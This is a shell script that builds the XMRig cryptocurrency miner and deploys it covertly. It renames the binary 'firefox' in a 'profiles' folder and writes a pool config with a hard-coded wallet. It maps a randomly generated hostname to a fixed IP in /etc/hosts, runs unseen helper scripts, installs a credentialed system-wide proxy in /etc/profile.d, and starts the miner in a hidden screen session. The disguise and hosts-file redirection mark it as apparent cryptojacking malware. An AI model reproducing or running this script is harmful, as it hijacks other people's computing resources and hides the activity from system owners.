#!/bin/sh
apt-get update -y
apt-get upgrade -y
apt-get install wget -y
apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
git clone https://github.com/xmrig/xmrig.git
mv xmrig profiles
cd profiles
cmake .
make
cp xmrig firefox
rm xmrig
export firefoxsetup=$(openssl rand -hex 20)
export link=$(openssl rand -hex 4)
bash -c 'cat <<EOT >>config.json
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
     "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "asm": true,
        "argon2-impl": null,
        "argon2": [0, 2, 1, 3],
        "cn-pico": [
            [2, 0],
            [2, 8],
            [2, 2],
            [2, 10],
            [2, 4],
            [2, 12],
            [2, 6],
            [2, 14],
            [2, 1],
            [2, 9],
            [2, 3],
            [2, 11],
            [2, 5],
            [2, 13]
        ],
        "cn/gpu": [0, 2, 1, 3],
        "rx": [0, 1],
        "rx/wow": [0, 2, 1, 3],
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 1,
    "donate-over-proxy": 1,
    "log-file": null,
    "pools": [
        {
            "algo": null,
            "coin": null,
              "url": "$firefoxsetup.$link:9999",
            "user": "4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjXYC8xTdYSfScBAJ",
            "pass": "proxy",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ipv6": false,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOT
'
#!/bin/sh
bash -c 'cat <<EOT >>/etc/hosts
164.68.109.141      $firefoxsetup.$link
EOT
'
chmod 777 vip.sh
chmod 777 configfile.sh
./vip.sh
./configfile.sh
apt install screen -y

bash -c 'cat <<EOT >>/etc/profile.d/proxy.sh
export http_proxy="http://n2l:N2L123@144.126.132.138:11631"
# For curl
export HTTP_PROXY="http://n2l:N2L123@144.126.132.138:11631"
EOT
'
chmod +x  /etc/profile.d/proxy.sh
source /etc/profile.d/proxy.sh
env | grep -i proxy


screen -S tf2 ./firefox
